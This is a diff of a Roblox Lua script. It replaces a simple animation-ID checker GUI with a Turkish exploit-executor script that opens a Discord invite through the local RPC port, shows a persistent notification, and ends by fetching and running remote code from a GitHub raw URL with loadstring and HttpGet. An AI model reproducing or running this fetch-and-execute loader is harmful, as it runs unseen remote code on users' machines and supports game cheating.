@@ -1,69 +1,50 @@
-local player = game.Players.LocalPlayer
+local httpService = game:GetService("HttpService");
 
--- GUI Oluşturma
-local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-local checkAnimationButton = Instance.new("TextButton", screenGui)
-local animationIdLabel = Instance.new("TextLabel", screenGui)
+local invCode = "xJHCqm84cW";
+local httpRequest = (syn and syn.request) or http_request or function() end;
 
--- Check Animation ID Butonu
-checkAnimationButton.Size = UDim2.new(0, 200, 0, 50)
-checkAnimationButton.Position = UDim2.new(0, 10, 0, 10)
-checkAnimationButton.Text = "Check Animation ID"
-checkAnimationButton.Draggable = true
+local function launchDiscord()
+	if not httpRequest then warn("Exploit not supported. No HTTP found.") return end
+	
+	httpRequest({
+		Url = "http://127.0.0.1:6463/rpc?v=1",
+		Method = "POST",
+	
+		Headers = {
+			['Content-Type'] = 'application/json',
+			Origin = 'https://discord.com'
+		},
+	
+		Body = httpService:JSONEncode({
+			cmd = 'INVITE_BROWSER',
+			nonce = httpService:GenerateGUID(false),
+			args = {code = invCode}
+		})
+	})
+end;
 
--- Animasyon ID Etiketi
-animationIdLabel.Size = UDim2.new(0, 300, 0, 50)
-animationIdLabel.Position = UDim2.new(0, 10, 0, 70)
-animationIdLabel.Text = "Current Animation ID: None"
-animationIdLabel.TextColor3 = Color3.new(1, 1, 1)
-animationIdLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-animationIdLabel.BackgroundTransparency = 0.5
-animationIdLabel.Visible = false
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = launchDiscord
 
-local checkingAnimations = false
-local lastAnimId = nil
+game:GetService("StarterGui"):SetCore(
+	"SendNotification",
+	{
+		Title = "Türk Gui",
+		Duration = 99999999999999,
+		Text = "Türk Gui\n\nEn Iyi Script",
+		Button1 = "Discorda Gir!",
+		Callback = NotificationBindable
+	}
+)
 
--- Animasyon ID'lerini Etikete Yazdırma Fonksiyonu
-local function toggleAnimationCheck()
-    checkingAnimations = not checkingAnimations
-    
-    if checkingAnimations then
-        checkAnimationButton.Text = "Stop Checking"
-        animationIdLabel.Visible = true
-        
-        local function onAnimationPlayed(animTrack)
-            if checkingAnimations then
-                local animId = animTrack.Animation.AnimationId
-                if animId ~= lastAnimId then
-                    lastAnimId = animId
-                    animationIdLabel.Text = "Current Animation ID: " .. animId
-                    
-                    -- 5 saniye bekle ve ID'yi güncelle
-                    wait(5)
-                    if animId == lastAnimId then
-                        animationIdLabel.Text = "Current Animation ID: None"
-                        lastAnimId = nil
-                    end
-                end
-            end
-        end
-        
-        player.Character.Humanoid.AnimationPlayed:Connect(onAnimationPlayed)
-        
-    else
-        checkAnimationButton.Text = "Check Animation ID"
-        animationIdLabel.Visible = false
-    end
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/folixbey/turkyield/main/turkiyedl"))();
 
--- ID'yi Kopyalama Fonksiyonu
-local function copyToClipboard()
-    if lastAnimId then
-        setclipboard(lastAnimId)
-        animationIdLabel.Text = "Copied: " .. lastAnimId
-    end
-end
 
--- Buton İşlevi
-checkAnimationButton.MouseButton1Click:Connect(toggleAnimationCheck)
-animationIdLabel.MouseButton1Click:Connect(copyToClipboard)
+
+--	k4scripts
+--	.------.
+--	|4.--. |
+--	| :│/: |
+--	| :│\: |
+--	| '--'4|
+--	`------'
